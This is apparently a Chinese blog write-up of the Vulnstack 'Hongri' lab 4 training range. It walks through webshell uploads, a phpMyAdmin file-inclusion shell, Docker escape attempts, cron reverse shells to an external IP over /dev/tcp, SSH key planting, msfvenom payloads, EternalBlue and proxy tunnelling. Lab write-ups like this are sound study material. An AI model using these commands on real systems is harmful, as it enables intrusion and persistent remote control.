<!DOCTYPE html>

<html lang="zh-CN">

<head>
    
    <title>红日靶场(四)笔记 - M1N&#39;s Blog</title>
    <meta charset="UTF-8">
    <meta name="keywords" content="">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
    
    

    <link rel="shortcut icon" href="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" type="image/png" />
    <meta name="description" content="红日靶场四学习记录">
<meta property="og:type" content="article">
<meta property="og:title" content="红日靶场(四)笔记">
<meta property="og:url" content="http://blog.m1n.me/2021/11/16/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA(%E5%9B%9B)%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="M1N&#39;s Blog">
<meta property="og:description" content="红日靶场四学习记录">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041547309.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041548215.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549039.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549704.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549079.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549213.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549823.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550718.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550478.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550982.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550669.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550909.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550025.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550134.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550189.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550638.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550887.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550717.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550550.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550855.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551462.png">
<meta property="og:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551829.png">
<meta property="article:published_time" content="2021-11-16T14:22:21.000Z">
<meta property="article:modified_time" content="2022-01-04T07:58:28.813Z">
<meta property="article:author" content="M1N">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041547309.png">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css,npm/hexo-theme-nexmoe@latest/source/lib/mdui_043tiny/css/mdui.css,npm/hexo-theme-nexmoe@latest/source/lib/iconfont/iconfont.css?v=233" crossorigin>
    <link rel="stylesheet" href="/css/style.css?v=1641283248152">
     
    
    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1641283248152">
    
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="mdui-drawer-body-left">
    
    <div id="nexmoe-background">
        <div class="nexmoe-bg" style="background-image: url(https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/4.jpg)"></div>
        <div class="mdui-appbar mdui-shadow-0">
            <div class="mdui-toolbar">
                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
                <div class="mdui-toolbar-spacer"></div>
                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
                <a href="/" title="M1N" class="mdui-btn mdui-btn-icon"><img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" alt="M1N"></a>
            </div>
        </div>
    </div>
    <div id="nexmoe-header">
        <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="M1N">
            <img src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/head.png" alt="M1N" alt="M1N">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>文章</span>1</div>
        <div><span>标签</span>0</div>
        <div><span>分类</span>1</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                回到首页
            </div>
        </a>
        
    </div>
    <aside id="nexmoe-sidebar">
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
         
            <form id="search_form" action_e="https://cn.bing.com/search?q=site:m1n.me" onsubmit="return search();">
                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
            </form>
         
    </div>
</div>
    
    <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="https://github.com/m1nme/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
    
    
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">文章分类</h3>
    <div class="nexmoe-widget">

      <ul class="category-list">

        


        

        

        <li class="category-list-item">
          <a class="category-list-link" href="/categories/Writeup/">Writeup</a>
          <span class="category-list-count">1</span>
        </li>

        
      </ul>

    </div>
  </div>


    
    
    
</aside>
    <div class="nexmoe-copyright">
        &copy; 2022 M1N
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
        
    </div>
</div><!-- .nexmoe-drawer -->
    </div>
    <div id="nexmoe-content">
        <div class="nexmoe-primary">
            <div class="nexmoe-post">

  <article>
      
          <div class="nexmoe-post-cover" style="padding-bottom: NaN%;"> 
              <img data-src="https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%B0%81%E9%9D%A2/6.jpg" data-sizes="auto" alt="红日靶场(四)笔记" class="lazyload">
              <h1>红日靶场(四)笔记</h1>
          </div>
      
      
      <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
    <a><i class="nexmoefont icon-calendar-fill"></i>2021年11月16日</a>
    <a><i class="nexmoefont icon-areachart"></i>2k 字</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 9 分钟</a>
</div>

      

      <p>红日靶场四学习记录</p>
<span id="more"></span>
<h2 id="前言"><a class="markdownIt-Anchor" href="#前言">#</a> 前言</h2>
<p>因为做的过程中，时间跨度比较大，前半段是打的公司的靶场，后半段自己搭建靶场，故 IP 有所变动。拓扑如下：<br>
<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041547309.png" alt="13" class="lazyload"></p>
<p>Ubuntu 用 Docker 跑了三个 Web 服务，一台 Win7 域成员机，一台 Winserver2008 域控</p>
<h2 id="外网打点"><a class="markdownIt-Anchor" href="#外网打点">#</a> 外网打点</h2>
<h3 id="2001端口struct2"><a class="markdownIt-Anchor" href="#2001端口struct2">#</a> 2001 端口 Struct2</h3>
<p>Burp 抓包看到 Struct2 字样，直接工具测试一把梭</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170347.png" alt="" class="lazyload"></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815170720.png" alt="" class="lazyload"></p>
<h3 id="2002端口tomcat"><a class="markdownIt-Anchor" href="#2002端口tomcat">#</a> 2002 端口 Tomcat</h3>
<p>可以参考 https://www.freebuf.com/articles/web/271892.html</p>
<p>使用 PUT 上传冰蝎马，注意直接上传 <code>/shell.jsp</code>  不行哦</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815180101.png" alt="" class="lazyload"></p>
<h3 id="2003端口phpmyadmin-481"><a class="markdownIt-Anchor" href="#2003端口phpmyadmin-481">#</a> 2003 端口 phpMyAdmin 4.8.1</h3>
<p>可以参考 https://www.dazhuanlan.com/oliiiflorrr/topics/1144804</p>
<ol>
<li>
<p>验证漏洞是否存在</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210815181519.png" alt="" class="lazyload"></p>
</li>
<li>
<p>使用 SELECT 语句后包含 session 文件来 get shell，写 shell <code>SELECT &quot;&lt;?php phpinfo();file_put_contents('m1n.php', '&lt;?=@eval($_POST[1]);');?&gt;&quot;  </code> ，访问发现 <code>http://10.0.5.100:2003/index.php?target=db_sql.php?/../../../../../../../../../tmp/sess_a851fdf11a88214580de888e61ed1867</code>  出现 phpinfo，用蚁剑连接 m1n.php 即可。</p>
</li>
</ol>
<h2 id="docker逃逸2002端口的tomcat"><a class="markdownIt-Anchor" href="#docker逃逸2002端口的tomcat">#</a> Docker 逃逸（2002 端口的 Tomcat）</h2>
<h3 id="如何判断是否在docker里"><a class="markdownIt-Anchor" href="#如何判断是否在docker里">#</a> 如何判断是否在 Docker 里</h3>
<ul>
<li>检查  <code>/.dockerenv</code>  文件是否存在</li>
<li>检查  <code>/proc/1/cgroup</code>  内是否包含 Docker 等字符串</li>
</ul>
<h3 id="尝试dirtycow漏洞逃逸"><a class="markdownIt-Anchor" href="#尝试dirtycow漏洞逃逸">#</a> 尝试 DirtyCow 漏洞逃逸</h3>
<ol>
<li>
<p>下载 POC：<a target="_blank" rel="noopener" href="https://github.com/scumjr/dirtycow-vdso">https://github.com/scumjr/dirtycow-vdso</a></p>
</li>
<li>
<p>编译，上传，监听，运行，没反应，下一个。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/scumjr/</span>dirtycow-vdso.git<br>cd dirtycow-vdso<br>make<br>./<span class="hljs-number">0</span>xdeadbeef ip:port<br></code></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="尝试runc容器逃逸漏洞cve-2019-5736"><a class="markdownIt-Anchor" href="#尝试runc容器逃逸漏洞cve-2019-5736">#</a> 尝试 runC 容器逃逸漏洞（CVE-2019-5736）</h3>
<ol>
<li>下载 POC：<a target="_blank" rel="noopener" href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></li>
<li>改 POC，把 payload 那行改成自己 VPS 的 IP</li>
<li>编译（建议 Linux 环境下） <code>CGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build main.go</code></li>
<li>上传文件，监听端口，执行，没反应，下一个。</li>
</ol>
<h3 id="尝试特权模式逃逸"><a class="markdownIt-Anchor" href="#尝试特权模式逃逸">#</a> 尝试特权模式逃逸</h3>
<ol>
<li><code>fdisk -l</code>  查看磁盘</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816152320.png" alt="" class="lazyload"></p>
<ol start="2">
<li>
<p>在根目录下创建文件夹，把 /dev/sda1 挂在到该文件夹</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">mkdir</span> /m<span class="hljs-number">1</span>n<br><span class="hljs-attribute">mount</span> /dev/sda<span class="hljs-number">1</span> /m<span class="hljs-number">1</span>n<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>可以看到宿主机的文件都到了 /m1n 目录下</p>
</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041548215.png" alt="image-20210816152534150" class="lazyload"></p>
<h4 id="尝试写定时任务来反弹shell"><a class="markdownIt-Anchor" href="#尝试写定时任务来反弹shell">#</a> 尝试写定时任务来反弹 shell</h4>
<p>参考：<a target="_blank" rel="noopener" href="https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/">https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /</a></p>
<ol>
<li>写文件到 <code>/var/spool/cron/crontabs/root</code> ，注意写到 <code>/var/spool/cron/root</code>  不行嗷</li>
<li>同时注意 root 文件的权限必须为 600</li>
<li>注意定时任务文件内容中，路径要用绝对路径，建议把命令写成 <code>.sh</code>  文件，然后 <code>chmod +x</code> ，然后调用，不容易出错</li>
<li>也可以 <code>*/1 * * * *  bash -c &quot;bash -i  &gt;&amp;/dev/tcp/123.207.x.x/1234 0&gt;&amp;1&quot;</code></li>
<li>在本地的 Ubuntu20 虚拟机中成功反弹 shell，但是靶场环境下没法成功，写入了定时任务必须 restart 才可以执行，否则不执行，无奈。</li>
</ol>
<p><strong>定时任务相关笔记：</strong></p>
<ol>
<li>
<p>定时任务有时无法看到报错信息，可以这样获取报错信息</p>
<p><code>\* * * * * '/bin/bash -i &gt;&amp; /dev/tcp/192.168.0.106/7777 0&gt;&amp;1'&gt;/tmp/error.txt 2&gt;&amp;1</code></p>
</li>
<li>
<p>定时任务查看日志：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/zhangshengxiang/p/11842326.html">https://www.cnblogs.com/zhangshengxiang/p/11842326.html</a></p>
<p>（1）查看系统日志直接： <code>tail -f /var/log/syslog</code></p>
<p>（2）查看 crontab 日志：</p>
<p>​	方法 1</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>. 修改rsyslog文件，将<span class="hljs-regexp">/etc/</span>rsyslog.d/<span class="hljs-number">50</span>-default.conf 文件中的<span class="hljs-comment">#cron.*前的#删掉；</span><br><span class="hljs-number">2</span>. 重启rsyslog服务service rsyslog restart<br><span class="hljs-number">3</span>. 重启cron服务service cron restart<br></code></pre></td></tr></table></figure>
<p>​	方法 2</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>. 编辑 <span class="hljs-regexp">/etc/</span>syslog.conf，并且打开以cron.*开始的那行注释。<br><span class="hljs-number">2</span>. 运行 <span class="hljs-regexp">/etc/i</span>nit.d/sysklogd restart<br><span class="hljs-number">3</span>. 运行 <span class="hljs-regexp">/etc/i</span>nit.d/cron restart<br></code></pre></td></tr></table></figure>
<p>​	查看 cron 日志</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>. linux<br>看 <span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/cron这个文件就可以，可以用tail -f /</span>var<span class="hljs-regexp">/log/</span>cron观察（或者<span class="hljs-regexp">/var/</span>log/cron.log）<br><br><span class="hljs-number">2</span>. unix<br>在 <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/cron/</span>tmp文件中，有croutXXX001864的tmp文件，tail 这些文件就可以看到正在执行的任务了。<br><br><span class="hljs-number">3</span>. mail任务<br>在 <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root 文件中，有crontab执行日志的记录，用tail -f <span class="hljs-regexp">/var/</span>spool<span class="hljs-regexp">/mail/</span>root 即可查看最近的crontab执行情况<br></code></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="尝试写ssh公钥来连接"><a class="markdownIt-Anchor" href="#尝试写ssh公钥来连接">#</a> 尝试写.ssh 公钥来连接</h4>
<ol>
<li>
<p>本地生成公私钥</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span>-keygen -f m<span class="hljs-number">1</span>n<br><span class="hljs-attribute">chmod</span> <span class="hljs-number">600</span> m<span class="hljs-number">1</span>n<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>把 m1n.pub 文件上传到服务器的 <code>/root/.ssh/</code>  目录下（注意，是 /m1n 下的 /root/.ssh），没有这个目录就创建这个目录</p>
</li>
<li>
<p>把 m1n.pub 的文件内容写到 authorized_keys 文件中 <code>cat m1n.pub &gt; authorized_keys</code></p>
</li>
<li>
<p>然后 <code>ssh -i m1n root@ip</code>  连接，即可</p>
</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/20210816161055.png" alt="" class="lazyload"></p>
<ol start="5">
<li>踩坑笔记：不要写公钥到 <code>/home/ubuntu/.ssh/</code>  目录下，连不上。</li>
</ol>
<h2 id="内网渗透"><a class="markdownIt-Anchor" href="#内网渗透">#</a> 内网渗透</h2>
<h3 id="传"><a class="markdownIt-Anchor" href="#传">#</a> 传🐎</h3>
<h4 id="msf"><a class="markdownIt-Anchor" href="#msf">#</a> MSF🐎</h4>
<ol>
<li>
<p>生成 msf🐎</p>
<p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.192.168.145 LPORT=4444 -f elf &gt; mshell.elf</code></p>
</li>
<li>
<p>把🐎儿传到目标机子上面</p>
</li>
<li>
<p>攻击机执行以下</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">use exploit/multi/handler<br><span class="hljs-builtin-name">set</span> payload linux/x64/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> lhost 10.192.168.145<br><span class="hljs-builtin-name">set</span> lport 4444<br>run<br></code></pre></td></tr></table></figure>
</li>
<li>
<p>目标机器添加权限后执行 mshell.elf</p>
</li>
<li>
<p>kali 接收到 shell</p>
</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108261512059.png" alt="" class="lazyload"></p>
<ol start="5">
<li>
<p>msf 拿到 shell 后，需要导入路由，使用 msf6 的自动路由导入</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stata">background<br><br><span class="hljs-keyword">use</span> <span class="hljs-keyword">post</span>/multi/manage/autoroute<br><br><span class="hljs-keyword">set</span> session x<br><br><span class="hljs-keyword">run</span><br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271034464.png" alt="" class="lazyload"></p>
</li>
</ol>
<h3 id="代理转发"><a class="markdownIt-Anchor" href="#代理转发">#</a> 代理转发</h3>
<h4 id="使用ew代理转发"><a class="markdownIt-Anchor" href="#使用ew代理转发">#</a> 使用 ew 代理转发</h4>
<ol>
<li>上传 ew_for_linux64</li>
<li>执行 <code>./ew -s ssocksd -l 8888</code></li>
<li>更改 kali 的 /etc/proxychains4.conf 文件，添加 socks5 ip prot</li>
<li>在需要代理时，执行命令如 <code>proxychains4 curl http://127.0.0.1:2003/</code>  即可</li>
</ol>
<h3 id="ubuntu信息收集"><a class="markdownIt-Anchor" href="#ubuntu信息收集">#</a> Ubuntu 信息收集</h3>
<ol>
<li>
<p>从路由表可以看到有几个网段，有个 183 网段应该就是内网网段了</p>
</li>
<li>
<p>msf 进行一波存活扫描</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gams">use auxiliary/scanner/discovery/udp_probe<br><span class="hljs-keyword">set</span> rhosts <span class="hljs-comment">192.168.183.0-255</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">threads 5</span><br>run<br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271043598.png" alt="" class="lazyload"></p>
<p>可以看到有 128、130 两台机子。</p>
</li>
<li>
<p>扫一下 ms17-010</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> auxiliary/scanner/smb/smb_ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span><br><span class="hljs-attribute">set</span> rhosts <span class="hljs-number">192.168.183.128</span>-<span class="hljs-number">130</span><br><span class="hljs-attribute">run</span><br></code></pre></td></tr></table></figure>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271046846.png" alt="" class="lazyload"></p>
<p>可以看到 128 的 win7 和 130 的 winserver2008 都可能存在永恒之蓝。</p>
</li>
<li>
<p>尝试打永恒之蓝，测试发现 128 的 win7 能打通，130 的 winserver2008 打不通。</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gams">setg Proxies socks5:<span class="hljs-number">10.0</span><span class="hljs-number">.5</span><span class="hljs-number">.100</span>:<span class="hljs-number">8888</span>					<span class="hljs-comment">//MSF走ew的代理</span><br><span class="hljs-keyword">set</span> ReverseAllowProxy <span class="hljs-comment">true</span>							//开启反向代理<br>use <span class="hljs-comment">exploit</span>/windows/<span class="hljs-comment">smb</span>/ms17_010_eternalblue<br>set payload windows/<span class="hljs-comment">x64</span>/meterpreter/<span class="hljs-comment">bind_tcp</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">rhost 192.168.183.128</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">lport 4444</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">AutoRunScript post</span>/windows/<span class="hljs-comment">manage</span>/migrate       <span class="hljs-comment">//自动迁移进程</span><br>run<br></code></pre></td></tr></table></figure>
<p>成功拿下 shell</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202108271535393.png" alt="" class="lazyload"></p>
</li>
</ol>
<h3 id="win7权限维持"><a class="markdownIt-Anchor" href="#win7权限维持">#</a> Win7 权限维持</h3>
<ol>
<li>
<p>虽然拿到了 shell，但是在使用过程中发现这个 shell 经常掉线，只能想办法弄个稳定点的 shell</p>
</li>
<li>
<p>拿 ubuntu 当作跳板机，把 frps 传到 ubuntu 上，不修改配置，直接执行 <code>./frps -c ./frps.ini</code></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549039.png" alt="image-20211112170138230" class="lazyload"></p>
</li>
<li>
<p>把 frpc 上传到自己的 CS 服务器，修改 frpc.ini 后启动 frpc： <code>./frpc -c ./frpc.ini</code></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549704.png" alt="image-20211112170249583" class="lazyload"></p>
</li>
<li>
<p>CS 创建一个 ip 为 ubuntu 的监听器</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549079.png" alt="image-20211112170412976" class="lazyload"></p>
</li>
<li>
<p>生成马传到 win7 上执行即可上线</p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549213.png" alt="image-20211112170455408" class="lazyload"></p>
<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.157.128 LPORT=4455 -f exe -o mshell.exe</code></p>
<p>use exploit/multi/handler</p>
<p>set payload windows/meterpreter/reverse_tcp</p>
</li>
</ol>
<h3 id="win7信息收集"><a class="markdownIt-Anchor" href="#win7信息收集">#</a> Win7 信息收集</h3>
<ol>
<li>
<p><code>route print</code></p>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041549823.png" alt="image-20211112171015589" class="lazyload"></p>
</li>
<li>
<p><code>net user /domain</code></p>
</li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071737928.png" alt="" class="lazyload"></p>
<ol start="3">
<li><code>net user</code></li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071745632.png" alt="" class="lazyload"></p>
<ol start="4">
<li><code>net view</code></li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202109071742103.png" alt="" class="lazyload"></p>
<ol start="5">
<li><code>nslookup WIN-ENS2VR5TR3N</code></li>
</ol>
<p><img data-fancybox="gallery" data-sizes="auto" data-src="https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041550718.png" alt="image-20211112171507481" class="lazyload"></p>
